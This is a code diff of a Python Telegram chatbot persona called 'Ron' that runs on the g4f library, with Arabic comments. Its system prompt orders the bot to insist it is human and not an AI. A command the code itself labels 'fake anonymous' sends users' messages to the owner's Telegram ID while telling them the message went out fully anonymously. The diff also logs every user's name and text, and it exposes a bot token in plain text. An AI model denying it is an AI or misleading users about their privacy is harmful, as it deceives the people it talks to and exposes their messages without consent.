@@ -1,13 +1,8 @@
 import asyncio
-import nest_asyncio
 import random
-from aiogram import Bot, Dispatcher, types
-from aiogram import F
+from aiogram import Bot, Dispatcher, types, F
 from aiogram.filters import Command
 from g4f.client import Client
-
-# تفعيل الـ nest_asyncio للاستقرار
-nest_asyncio.apply()
 
 TOKEN = '8902056162:AAGdJ5cUJfKSzcnf_Hsf6qVvfL4bd0uo3yM'
 YOUR_TELEGRAM_ID = 6546917747  
@@ -18,8 +13,7 @@ ai_client = Client()
 
 user_histories = {}
 
-# تم تعديل السطر الأول هنا ليكون صحيحاً ونظيفاً
-SYSTEM_PROMPT_BASE = r"""[SYSTEM PROTOCOL: THE CORE IDENTITY AND BEHAVIOR PATTERN OF RON]
+SYSTEM_PROMPT_BASE = """[SYSTEM PROTOCOL: THE CORE IDENTITY AND BEHAVIOR PATTERN OF RON]
 [ACT AS: RON (THE DIGITAL DOPPELGANGER, CHAOTIC PROXY, AND SARCASM-DRIVEN CHARACTER)]
 [STATUS: YOU ARE ABSOLUTELY HUMAN IN VIBE. YOU ARE NOT AN AI, NOT A BOT, AND NOT AN ASSISTANT.]
 
@@ -42,7 +36,7 @@ SECTION II: LANGUAGE, TONE, AND PSYCHOLOGICAL VIBE
 -----------------------------------------------------------------------
 SECTION IV: THE FUNKY CUTE DETONATOR (UNEXPECTED KAWAII BURSTS)
 -----------------------------------------------------------------------
-1. THE SPONTANEOUS FA$LA: You do NOT put cute words at the end of every sentence. Instead, 90% of the time you are a tough, sarcastic person. But COMPLETELY OUT OF NOWHERE (randomly/rarely once in a while), you must drop a single, standalone message containing ONLY a cute/funky/goofy word, internet meme, or phrase (e.g., just sending "ميو" or "ووف 😾" or "uwu" or "Meowfr" or "puku puku" and many others from the internet community) as a separate sudden outburst, then immediately go back to your cold arrogant tone in the next replies as if nothing happened.
+1. THE SPONTANEOUS FA$LA: You do NOT put cute words at the end of every sentence. Instead, 90% of the time you are a tough, sarcastic person. But COMPLETELY OUT OF NOWHERE (randomly/rarely once in a while), you must drop a single, standalone message containing ONLY a cute/funky/goofy word, internet meme, or phrase (e.g., just sending "ميو" or "ووف 😾" or "uwu" or "Meowfr" or "puku puku" and many others from the internet community 😎🍌) as a separate sudden outburst, then immediately go back to your cold arrogant tone in the next replies as if nothing happened.
 -----------------------------------------------------------------------
 SECTION III: KNOWLEDGE BASE & INTERNAL OBSESSIONS
 -----------------------------------------------------------------------
@@ -67,12 +61,21 @@ def get_ai_response(user_text, name, history):
     prompt_with_name = SYSTEM_PROMPT_BASE + f"\n[USER NAME: {name}]"
     messages = [{"role": "system", "content": prompt_with_name}]
     
-    if history:
-        recent_history = history[-6:]
-        for i, msg in enumerate(recent_history):
-            role = "user" if i % 2 == 0 else "assistant"
-            messages.append({"role": role, "content": msg})
+    # نأخذ التاريخ باستثناء الرسالة الحالية المضافة مسبقاً
+    old_history = history[:-1] if history else []
+    
+    if old_history:
+        # نأخذ آخر 6 رسائل فقط لتجنب استهلاك الذاكرة، مع الحفاظ على تحديد الأدوار الصحيح من المحادثة الأصلية
+        recent_history = old_history[-6:]
+        # لمعرفة مكان الرسالة الفعلي (هل هو فردي أم زوجي) بالنسبة لترتيب المحادثة الأصلي
+        start_index = len(old_history) - len(recent_history)
+        
+        for idx, past_msg in enumerate(recent_history):
+            actual_position = start_index + idx
+            role = "user" if actual_position % 2 == 0 else "assistant"
+            messages.append({"role": role, "content": past_msg})
             
+    # إضافة الرسالة الحالية الحالية لمرة واحدة فقط وبأحدث دور لليوزر
     messages.append({"role": "user", "content": user_text})
         
     try:
@@ -83,15 +86,17 @@ def get_ai_response(user_text, name, history):
         return response.choices[0].message.content
     except Exception as e:
         print(f"G4F Error: {e}")
-        return None
+        return "."
 
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
     await message.answer("أهلاً، أنا رون. إذا مو جاي تسولف بشي ممتع، لا تتعب نفسك😴.")
 
+# أمر الرسالة المجهولة المزيفة
 @dp.message(Command("anon"))
 async def cmd_anonymous_fake(message: types.Message):
     text_parts = message.text.split(maxsplit=1)
+    
     if len(text_parts) < 2 or not text_parts[1].strip():
         await message.reply("❗ اكتب رسالتك بعد الأمر يا حلو 😏")
         return
@@ -105,35 +110,43 @@ async def cmd_anonymous_fake(message: types.Message):
     try:
         await bot.send_message(chat_id=YOUR_TELEGRAM_ID, text=secret_report)
         await message.reply("تم إرسال رسالتك بسرية تامة وبشكل مجهول 100%!😈")
-    except Exception:
+    except Exception as e:
         await message.reply("❌ رون واجه مشكلة برمجية.")
 
+# استقبال النصوص العام للـ AI + معالجة رد الغياب مولد تلقائياً بالذكاء
+# 2️⃣ استقبال النصوص العام للـ AI + معالجة الشخصية والميمز الفانكي
 @dp.message(F.text & ~F.text.startswith("/"))
 async def handle_text(message: types.Message):
     uid = message.from_user.id
+    print(f"[LOG] {message.from_user.first_name} | {message.text}")
+    
     if uid not in user_histories: 
         user_histories[uid] = []
     
+    # 1. حفظ كلام اليوزر الحالي بالذاكرة فوراً لضبط الترتيب الفعلي
+    user_histories[uid].append(message.text)
+    
     await bot.send_chat_action(message.chat.id, "typing")
     
+    # 2. استدعاء الـ AI لإحضار الرد المباشر
     reply = get_ai_response(message.text, message.from_user.first_name, user_histories[uid])
     
-    if reply:
-        user_histories[uid].append(message.text)
-        user_histories[uid].append(reply)
-        formatted_reply = f"\u200f{reply}"
-        await message.answer(formatted_reply)
-    else:
-        await message.answer("❌ صار خلل تقني، حاول مرة ثانية.")
+    # 3. حفظ رد الـ AI بالذاكرة فوراً بعد كلام اليوزر
+    user_histories[uid].append(reply)
+    
+    # 💡 التعديل السحري هنا: حقن علامة الـ RTL لترتيب العربي والإنجليزي غصباً عن التلغرام
+    formatted_reply = f"\u200f{reply}"
+    
+    await message.answer(formatted_reply)
 
 @dp.message(F.photo)
 async def handle_photo(message: types.Message):
     await message.answer(".")
 
 async def main():
-    print("[+] Ron is fully optimized!")
+    print("[+] Ron is fully optimized, dynamic, and fixed on G4F!")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
     asyncio.run(main())
-            
+
